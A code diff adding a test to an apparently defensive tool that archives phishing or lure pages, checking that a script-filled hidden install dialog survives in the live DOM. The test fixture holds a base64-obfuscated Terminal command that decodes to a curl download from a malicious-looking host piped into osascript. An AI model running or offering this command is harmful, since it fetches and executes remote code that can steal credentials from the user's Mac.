@@ -1065,6 +1065,25 @@ document.getElementById("box").addEventListener("click", async () => {
 		}
 	}, 60_000);
 
+	test("keeps the live DOM with the closed install dialog a script filled in, which the MHTML and the visitor text leave out", async () => {
+		// Production case 380697679325302795: macmorrow.app fetches its paste command into a
+		// `hidden` dialog; Chrome's MHTML drops what is not rendered, so only the live DOM holds it.
+		const hits: string[] = [];
+		const command = "echo 'Y3VybCAtc2ZMIGh0dHBzOi8va2V5Y2hhaW5hZ2VudC5wcm8vd2tzeGdqL3lYMWZRV0ZHdzlycCB8IG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0' | base64 -d | zsh";
+		const server = serveKit(`<!DOCTYPE html><html><body><h1>MacMorrow</h1><button>Download for Mac</button>
+<dialog id="installDialog"><div id="macInstall" hidden><strong>Open Terminal</strong><code id="installCommand">Installation command is being prepared.</code></div></dialog>
+<script>setTimeout(() => { document.getElementById("installCommand").textContent = ${JSON.stringify(command)}; }, 100);</script></body></html>`, hits);
+		try {
+			const archive = await archiveWebsite({ url: `http://127.0.0.1:${server.port}/` }, { ...fast, renderSettleMs: 1_000, getBrowser: launch });
+			expect(archive.documentHtml).toContain(command);
+			expect(archive.documentHtml).toContain("Open Terminal");
+			expect(archive.text.toString()).not.toContain("base64");
+			expect(archive.mhtml.toString("latin1").replace(/=\r?\n/g, "")).not.toContain("Y3VybCAtc2ZM");
+		} finally {
+			server.stop(true);
+		}
+	}, 60_000);
+
 	test("captures a kit that swaps its real page in from a blob: URL as the page it loaded", async () => {
 		const hits: string[] = [];
 		const server = serveKit(`<!DOCTYPE html><html><body><div class="spinner"></div><script>
